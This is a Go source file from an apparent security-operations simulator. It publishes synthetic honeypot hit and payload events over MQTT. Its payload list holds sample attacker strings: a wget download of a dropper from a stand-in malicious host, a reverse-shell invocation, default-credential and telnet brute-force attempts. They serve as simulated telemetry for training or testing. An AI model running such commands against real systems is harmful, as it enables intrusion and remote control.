package publishers

import (
	"context"
	"log"

	"soc-mqtt-simulator/backend/models"
	socmqtt "soc-mqtt-simulator/backend/mqtt"
)

func StartHoneypot(ctx context.Context, brokerURL string, sim *Simulator) error {
	agent := Agent{
		Name:        "honeypot",
		ClientID:    "publisher-honeypot-agent",
		StatusTopic: socmqtt.TopicHoneypotStatus,
		BrokerURL:   brokerURL,
	}
	client, err := agent.connect()
	if err != nil {
		return err
	}
	go client.Wait(ctx)

	go func() {
		log.Printf("[publisher:honeypot] started")
		payloads := []string{
			"wget http://malicious.example/dropper.sh",
			"python -c reverse_shell",
			"admin:admin credential attempt",
			"/bin/busybox telnet brute force",
		}
		for sim.Delay(ctx, 5, 15) {
			source := randomIP()
			publishEvent(client, socmqtt.TopicHoneypotHit, socmqtt.QoSAtLeastOnce, true, EventPayload{
				Type:        models.Honeypot,
				Severity:    models.High,
				SourceIP:    source,
				DestIP:      "10.10.10.5",
				Port:        randomPort(),
				Description: "Attacker interaction captured by honeypot",
				Agent:       "honeypot",
			})
			publishEvent(client, socmqtt.TopicHoneypotPayload, socmqtt.QoSAtLeastOnce, false, EventPayload{
				Type:        models.Malware,
				Severity:    models.High,
				SourceIP:    source,
				DestIP:      "10.10.10.5",
				Port:        23,
				Description: "Honeypot captured attack payload",
				Agent:       "honeypot",
				Payload:     payloads[randIntn(len(payloads))],
			})
		}
	}()

	return nil
}
